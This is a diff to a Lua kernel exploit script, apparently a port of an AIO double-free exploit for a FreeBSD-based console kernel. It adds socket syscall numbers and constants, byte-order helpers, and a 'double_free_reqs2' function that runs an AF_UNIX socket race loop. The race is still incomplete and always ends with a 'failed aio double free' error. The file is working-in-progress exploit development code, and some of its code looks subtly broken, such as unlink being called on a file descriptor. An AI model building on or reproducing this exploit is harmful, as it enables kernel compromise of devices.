@@ -1,5 +1,13 @@
 
 syscall.resolve({
+    unlink = 0xa,
+
+    socket = 0x61,
+    connect = 0x62,
+    bind = 0x68,
+    setsockopt = 0x69,
+    listen = 0x6a,
+    
     socketpair = 0x87,
     cpuset_getaffinity = 0x1e7,
     cpuset_setaffinity = 0x1e8,
@@ -98,6 +106,15 @@ AF_UNIX = 1
 AF_INET = 2
 AF_INET6 = 28
 
+-- globals.lua
+SOCK_STREAM = 1
+SOCK_DGRAM = 2
+IPPROTO_UDP = 17
+IPPROTO_IPV6 = 41
+IPV6_PKTINFO = 46
+INADDR_ANY = 0
+--
+
 AIO_CMD_READ = 1
 AIO_CMD_WRITE = 2
 AIO_CMD_FLAG_MULTI = 0x1000
@@ -112,6 +129,7 @@ MAIN_RTPRIO = 0x100
 NUM_WORKERS = 2
 NUM_GROOMS = 0x200
 NUM_HANDLES = 0x100
+NUM_RACES = 100
 NUM_SDS = 0x100
 
 -- max number of requests that can be created/polled/canceled/deleted/waited
@@ -189,6 +207,13 @@ function aio_multi_wait(ids, num_ids, states, mode, timeout)
     return syscall.aio_multi_wait(ids, num_ids, states, mode, timeout):tonumber()
 end
 
+function new_socket()
+    return syscall.socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP):tonumber()
+end
+
+function new_tcp_socket()
+    return syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
+end
 
 function make_reqs1(num_reqs)
     local reqs1 = memory.alloc(0x28 * num_reqs)
@@ -321,6 +346,94 @@ function setup(block_fd)
 end
 
 
+function double_free_reqs2(sds)
+    local function htons(port)
+        return bit32.bor(bit32.lshift(port, 8), bit32.rshift(port, 8)) % 0x10000
+    end
+
+    local function htonl(hostlong)
+        local b1 = bit32.band(bit32.rshift(hostlong, 24), 0xFF)
+        local b2 = bit32.band(bit32.rshift(hostlong, 16), 0xFF)
+        local b3 = bit32.band(bit32.rshift(hostlong, 8),  0xFF)
+        local b4 = bit32.band(hostlong,                   0xFF)
+    
+        local swapped_long = bit32.bor(
+            bit32.lshift(b4, 24),
+            bit32.lshift(b3, 16),
+            bit32.lshift(b2, 8),
+            b1
+        )
+    
+        return swapped_long % 0x100000000
+    end
+
+    local socket_path = "/mnt/sandbox/socket"
+    
+    local server_addr = memory.alloc(128)
+    local addrlen = memory.alloc(8)
+    
+    -- Set address family to AF_UNIX
+    memory.write_byte(server_addr + 1, AF_UNIX)
+    
+    -- Write socket path to the structure
+    for i = 1, #socket_path do
+        memory.write_byte(server_addr + 2 + (i-1), string.byte(socket_path, i))
+    end
+    memory.write_byte(server_addr + 2 + #socket_path, 0)  -- Add null terminator
+    
+    local addr_size = 2 + #socket_path + 1  -- family byte + path + null terminator
+    
+    -- const racer = new Chain();
+    -- const barrier = new Long();
+    -- call_nze('pthread_barrier_init', barrier.addr, 0, 2);
+
+    local num_reqs = 3
+    local which_req = num_reqs - 1
+    local reqs1 = make_reqs1(num_reqs)
+    local aio_ids = memory.alloc(4 * num_reqs)
+    local cmd = AIO_CMD_MULTI_READ
+
+    syscall.unlink(socket_path)
+
+    local server_fd = syscall.socket(AF_UNIX, SOCK_STREAM, 0):tonumber()
+    if server_fd < 0 then
+        error("socket() error: " .. get_error_string())
+    end
+    
+    if syscall.bind(server_fd, server_addr, addr_size):tonumber() < 0 then
+        error("bind() error: " .. get_error_string())
+    end
+ 
+    if syscall.listen(server_fd, 1):tonumber() < 0 then
+        error("listen() error: " .. get_error_string())
+    end
+
+    for i=0,NUM_RACES do
+        local client_fd = syscall.socket(AF_UNIX, SOCK_STREAM, 0):tonumber()
+        if client_fd < 0 then
+            error("socket() error: " .. get_error_string())
+        end
+
+        if syscall.connect(client_fd, server_addr, addr_size):tonumber() < 0 then
+            error("connect() error: " .. get_error_string())
+        end
+
+        local conn_fd = syscall.accept(server_fd, 0, 0):tonumber()
+        if conn_fd < 0 then
+            print("accept() error: " .. get_error_string())
+        end
+        
+        -- Don't forget to close the client socket in each iteration
+        syscall.close(client_fd)
+        syscall.close(conn_fd)
+    end
+
+    -- Clean up the socket file when done
+    syscall.close(server_fd)
+    syscall.unlink(server_fd)
+    
+    error('failed aio double free')
+end
 
 function kexploit()
 
@@ -352,6 +465,9 @@ function kexploit()
     local block_id, groom_ids = setup(block_fd)
 
     dbgf("block_id %s groom_ids %s", hex(block_id), hex(groom_ids))
+
+    print("[+] Double-free AIO")
+    local sd_pair = double_free_reqs2(sock_fds)
 
 end
 
